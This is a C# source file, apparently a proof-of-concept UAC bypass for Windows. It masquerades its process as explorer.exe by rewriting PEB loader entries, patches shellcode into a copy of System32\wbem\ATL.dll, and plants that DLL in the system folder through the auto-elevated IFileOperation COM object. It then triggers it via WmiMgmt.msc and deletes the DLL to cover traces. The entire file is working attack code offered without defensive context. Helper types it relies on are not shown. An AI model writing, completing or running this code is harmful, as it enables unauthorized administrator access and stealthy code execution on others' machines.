// Compile with: Add references to COM (Shell32), Windows Base libraries
// Target Framework: .NET Framework 4.8
// Requires /unsafe

using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices.ComTypes;

namespace UacBypass
{
    internal class Program
    {
        static void Main()
        {
            NativeMethods.CoInitializeEx(IntPtr.Zero, NativeMethods.COINIT_APARTMENTTHREADED | NativeMethods.COINIT_DISABLE_OLE1DDE | NativeMethods.COINIT_SPEED_OVER_MEMORY);
            AppDomain.CurrentDomain.ProcessExit += (s, e) => NativeMethods.CoUninitialize();
            IntPtr winPathPtr;
            NativeMethods.SHGetKnownFolderPath(NativeMethods.FOLDERID_Windows, 0, IntPtr.Zero, out winPathPtr);
            string windowsFolder = Marshal.PtrToStringUni(winPathPtr);
            Marshal.FreeCoTaskMem(winPathPtr);
            string explorerPath = Path.Combine(windowsFolder, "explorer.exe");
            IntPtr sysPathPtr;
            NativeMethods.SHGetKnownFolderPath(NativeMethods.FOLDERID_System, 0, IntPtr.Zero, out sysPathPtr);
            string systemFolder = Marshal.PtrToStringUni(sysPathPtr);
            Marshal.FreeCoTaskMem(sysPathPtr);
            string atlPath = Path.Combine(systemFolder, "wbem", "ATL.dll");
            Console.WriteLine($"[+] Windows Folder: {windowsFolder}");
            Console.WriteLine($"[+] System Folder: {systemFolder}");
            MasqueradeAsExplorer(explorerPath);
            byte[] dllBytes = File.ReadAllBytes(atlPath);
            Console.WriteLine("[*] Read ATL.dll from wbem");
            PatchDLL(dllBytes);
            string dropperPath = Path.Combine(Directory.GetCurrentDirectory(), "dropper");
            File.WriteAllBytes(dropperPath, dllBytes);
            Console.WriteLine("[+] Wrote patched DLL as dropper");
            ElevateAndMove(dropperPath, Path.Combine(systemFolder, "wbem"), "ATL.dll");
            NativeMethods.ShellExecuteW(IntPtr.Zero, "open", "WmiMgmt.msc", null, null, 0);
            System.Threading.Thread.Sleep(2000);
            ElevateAndDelete(Path.Combine(systemFolder, "wbem", "ATL.dll"));
            Console.WriteLine("[+] Done.");
        }

        unsafe static void MasqueradeAsExplorer(string explorerPath)
        {
            var peb = (PEB*)NtQuery.GetPeb();
            var ldr = (PEB_LDR_DATA*)peb->Ldr;
            LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
            LIST_ENTRY* current = head->Flink;

            while (current != head)
            {
                var entry = (LDR_DATA_TABLE_ENTRY*)current;
                if ((IntPtr)entry->DllBase == NtQuery.GetModuleHandle(null))
                {
                    string newName = "explorer.exe";

                    fixed (char* namePtr = newName)
                    {
                        entry->BaseDllName.Buffer = namePtr;
                        entry->BaseDllName.Length = (ushort)(newName.Length * 2);
                        entry->BaseDllName.MaximumLength = (ushort)((newName.Length + 1) * 2);
                    }

                    fixed (char* fullPtr = explorerPath)
                    {
                        entry->FullDllName.Buffer = fullPtr;
                        entry->FullDllName.Length = (ushort)(explorerPath.Length * 2);
                        entry->FullDllName.MaximumLength = (ushort)((explorerPath.Length + 1) * 2);
                    }

                    Console.WriteLine("[*] Process masqueraded as explorer.exe");
                    break;
                }
                current = current->Flink;
            }
        }

        static void PatchDLL(byte[] dllBytes)
        {
            byte[] shellcode = new byte[]
            {
                0x49, 0x89, 0xE3, 0x48, 0x81, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x0F, 0x57,
                0xC0, 0x48, 0x8D, 0x0D, 0x75, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x45, 0x31,
                0xC9, 0x0F, 0x11, 0x44, 0x24, 0x54, 0x45, 0x31, 0xC0, 0x31, 0xD2, 0x0F,
                0x11, 0x44, 0x24, 0x64, 0x0F, 0x11, 0x44, 0x24, 0x74, 0x41, 0x89, 0x43,
                0xCC, 0x49, 0x8D, 0x43, 0xD8, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D,
                0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x40, 0x31, 0xC0, 0x48, 0x89,
                0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x30, 0x89, 0x44, 0x24, 0x28,
                0x41, 0x0F, 0x11, 0x43, 0x9C, 0x89, 0x44, 0x24, 0x20, 0x41, 0x0F, 0x11,
                0x43, 0xAC, 0x41, 0x0F, 0x11, 0x43, 0xBC, 0xC7, 0x44, 0x24, 0x50, 0x68,
                0x00, 0x00, 0x00, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0xFF, 0xD0, 0x31, 0xC9, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0xFF, 0xD0
            };

            int e_lfanew = BitConverter.ToInt32(dllBytes, 0x3C);
            int entryPointRva = BitConverter.ToInt32(dllBytes, e_lfanew + 0x28);
            int sectionAlignment = BitConverter.ToInt32(dllBytes, e_lfanew + 0x38);

            int sectionOffset = FindSectionOffset(dllBytes, e_lfanew, ".text");
            int entryOffset = entryPointRva - sectionAlignment + sectionOffset;

            Array.Copy(shellcode, 0, dllBytes, entryOffset, shellcode.Length);

            Console.WriteLine("[+] Shellcode patched into ATL.dll");
        }

        static int FindSectionOffset(byte[] dllBytes, int e_lfanew, string sectionName)
        {
            int numberOfSections = BitConverter.ToInt16(dllBytes, e_lfanew + 0x6);
            int sectionTableOffset = e_lfanew + 0xF8;

            for (int i = 0; i < numberOfSections; i++)
            {
                int nameOffset = sectionTableOffset + (i * 40);
                string name = Encoding.ASCII.GetString(dllBytes, nameOffset, 8).TrimEnd('\0');
                if (name == sectionName)
                {
                    return BitConverter.ToInt32(dllBytes, nameOffset + 0x14);
                }
            }
            throw new Exception("Section not found");
        }

        static void ElevateAndMove(string sourcePath, string destinationFolder, string newName)
        {
            NativeMethods.CoGetObject(
                "Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}",
                ref NativeMethods.defaultBindOpts,
                NativeMethods.IID_IFileOperation,
                out IFileOperation operation);

            NativeMethods.SHCreateItemFromParsingName(sourcePath, IntPtr.Zero, NativeMethods.IID_IShellItem, out IShellItem sourceItem);
            NativeMethods.SHCreateItemFromParsingName(destinationFolder, IntPtr.Zero, NativeMethods.IID_IShellItem, out IShellItem destFolder);

            operation.SetOperationFlags(NativeMethods.FOF_NOCONFIRMATION | NativeMethods.FOF_NOERRORUI | NativeMethods.FOFX_NOCOPYHOOKS | NativeMethods.FOFX_REQUIREELEVATION);
            operation.MoveItem(sourceItem, destFolder, newName, IntPtr.Zero);
            operation.PerformOperations();

            Console.WriteLine("[+] Dropper moved into wbem\\ATL.dll");
        }

        static void ElevateAndDelete(string targetPath)
        {
            NativeMethods.CoGetObject(
                "Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}",
                ref NativeMethods.defaultBindOpts,
                NativeMethods.IID_IFileOperation,
                out IFileOperation operation);

            NativeMethods.SHCreateItemFromParsingName(targetPath, IntPtr.Zero, NativeMethods.IID_IShellItem, out IShellItem targetItem);

            operation.SetOperationFlags(NativeMethods.FOF_NOCONFIRMATION | NativeMethods.FOF_NOERRORUI | NativeMethods.FOFX_NOCOPYHOOKS | NativeMethods.FOFX_REQUIREELEVATION);
            operation.DeleteItem(targetItem, IntPtr.Zero);
            operation.PerformOperations();

            Console.WriteLine("[+] Cleaned up ATL.dll");
        }
    }
}
